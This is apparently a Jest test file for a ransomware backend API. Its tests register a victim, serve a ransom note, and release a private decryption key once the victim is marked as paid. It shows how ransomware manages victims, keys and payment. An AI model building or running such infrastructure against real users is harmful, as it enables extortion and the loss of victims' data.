const request = require('supertest');
const fs = require('fs');
const os = require('os');
const path = require('path');

const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'rob-api-test-'));
process.env.ROB_DB_FILE = path.join(tempDir, 'victims.json');

const app = require('../index');
const db = require('../db/database');

describe('Ransomware Backend API', () => {
    let testVictimId;

    afterAll(() => {
        fs.rmSync(tempDir, { recursive: true, force: true });
    });

    it('POST /api/register should return a victimId and public key', async () => {
        const res = await request(app).post('/api/register');
        
        expect(res.statusCode).toEqual(201);
        expect(res.body).toHaveProperty('victimId');
        expect(res.body).toHaveProperty('publicKey');
        expect(res.body.publicKey).toMatch(/BEGIN PUBLIC KEY/);

        testVictimId = res.body.victimId;
    });

    it('GET /api/ransom/:victimId should return the ransom note HTML', async () => {
        const res = await request(app).get(`/api/ransom/${testVictimId}`);
        
        expect(res.statusCode).toEqual(200);
        expect(res.text).toContain(testVictimId);
    });

    it('POST /api/decrypt-key/:victimId should return the private key', async () => {
        const res = await request(app).post(`/api/decrypt-key/${testVictimId}`);
        
        expect(res.statusCode).toEqual(200);
        expect(res.body).toHaveProperty('privateKey');
        expect(res.body.privateKey).toMatch(/BEGIN PRIVATE KEY/);
        
        // Verify DB updated
        const victim = db.getVictim(testVictimId);
        expect(victim.paid).toBe(true);
    });
});
